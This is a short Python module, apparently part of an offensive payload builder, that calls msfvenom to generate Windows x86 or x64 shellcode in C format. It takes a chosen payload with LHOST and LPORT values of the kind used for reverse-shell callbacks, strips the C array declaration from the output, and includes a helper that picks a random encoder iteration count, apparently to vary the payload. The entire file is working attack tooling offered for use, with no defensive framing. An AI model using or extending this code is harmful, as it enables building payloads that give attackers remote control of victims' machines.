from lib import core
import random
import subprocess


def SHELLCODE_GENERATION(ARCHITECTURE, PAYLOAD, LHOST, LPORT):
    if ARCHITECTURE == "X86":
        MSFVENOM = ['msfvenom', '-a', 'x86', '--platform', 'windows', '-p', PAYLOAD, LHOST, LPORT, '-f', 'c']
        core.GENERATING_SHELLCODE()
        SHELLCODE = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
        core.SHELLCODE_GENERATED()
        SHELLCODE = UNNECESSARY_CHARACTERS(SHELLCODE)
        return SHELLCODE

    elif ARCHITECTURE == "X64":
        MSFVENOM = ['msfvenom', '-a', 'x64', '--platform', 'windows', '-p', PAYLOAD, LHOST, LPORT, '-f', 'c']
        core.GENERATING_SHELLCODE()
        SHELLCODE = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
        core.SHELLCODE_GENERATED()
        SHELLCODE = UNNECESSARY_CHARACTERS(SHELLCODE)
        return SHELLCODE


def UNNECESSARY_CHARACTERS(SHELLCODE):
    SHELLCODE_V2 = SHELLCODE
    SHELLCODE_V2 = SHELLCODE_V2.replace('unsigned char buf[] =', '')
    return SHELLCODE_V2


def RANDOM_ENCODER_ITERATION():
    ITERATION = str(random.randint(1, 3))
    return ITERATION
